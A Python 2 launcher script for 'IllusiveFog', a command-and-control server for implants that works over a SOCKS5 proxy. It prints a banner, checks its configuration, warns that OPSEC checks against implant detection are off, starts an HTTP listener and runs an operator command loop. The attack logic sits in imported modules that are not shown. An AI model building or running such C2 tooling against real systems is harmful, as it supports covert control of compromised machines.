import c2_socks5
import helper
import http_server
#import submenu
import configs
import sys
import thread,os,traceback
from time import sleep
from modules import moduleManager

__status__ = "1.0 Beta"
__codename__ = "MaskedMan"

banner = r"""
.___.__  .__               .__            ___________            
|   |  | |  |  __ __  _____|__|__  __ ____\_   _____/___   ____  
|   |  | |  | |  |  \/  ___/  \  \/ // __ \|    __)/  _ \ / ___\ 
|   |  |_|  |_|  |  /\___ \|  |\   /\  ___/|     \(  <_> ) /_/  >
|___|____/____/____//____  >__| \_/  \___  >___  / \____/\___  / 
                         \/              \/    \/       /_____/          
		Socks5 Proxy Based Administrator Level C2 Server
		Status	 : 	{0}
		Code Name:	{1}
""".format(__status__,__codename__)

c2_config = configs.configuration.c2
flask_opt = configs.configuration.flask

class IllusiveFogStarter:
	def __init__(self):
		pass

	"""Check Module loading before starting everything"""
	def CheckLoadModules(self):
		print "[+] Loading Modules."
		try:
			moduleManager.moduleCheckonBoot()
		except ImportError as e:
			print "[-] Error Loading Modules:\n",e
			pass
	"""Check Environment"""
	def CheckEnviron(self):
		try:
			assert sys.version_info >= (2,7)
			if c2_config['CLEARSCR'] == "TRUE":
					if os.name == "nt":
						os.system("cls")
					else:
						os.system("clear")

			if c2_config['BANNER'] == "TRUE":
					print banner

			if c2_config['OPSEC_SAFETY'] == "FALSE":
						print """
	[WARNING!] OPSEC Checks is turned OFF.
	---------> Note:Any action considered alarming won't pass through OPSEC Checks."""
						print "                So if any false from your side can be tricky to get implant detected."
						print "                !!! BE CAREFUL WITH WHAT YOU WISH FOR !!!"
			else:
					print ""

		except AssertionError:
			print "[-] Only Python 2.7 is supported\n"
			sys.exit()

	""" Starting HTTP Server """
	def ServerStart(self):
		print "\n[+] Server Starting on {0}:{1}".format(c2_config['IP'],c2_config['PORT'])
		http_server.ServerManager().ServerRun(c2_config['IP'],c2_config['PORT'])

	def main(self):
		try :
			self.CheckEnviron()
			self.CheckLoadModules()
			http_thread= http_server.KThread(target=self.ServerStart)
			http_thread.daemon = True
			http_thread.start()
			sleep(2)
			print "\n"
			
			while 1:	
				try:
					IllusiveFogInit = c2_socks5.IllusiveFogMain()
					IllusiveFogInit.cmdloop('')
				except Exception as e:
					print "[Error] : {0}".format(traceback.format_exc())
					
		except Exception as e:
			#print traceback.format_exc() 
			print ("IllusiveFog Encountered An Error : \n{0}".format(traceback.format_exc()))
			pass
			#sys.exit()
def start():
	mymain = IllusiveFogStarter()
	mymain.main()
if __name__ == "__main__":
	start()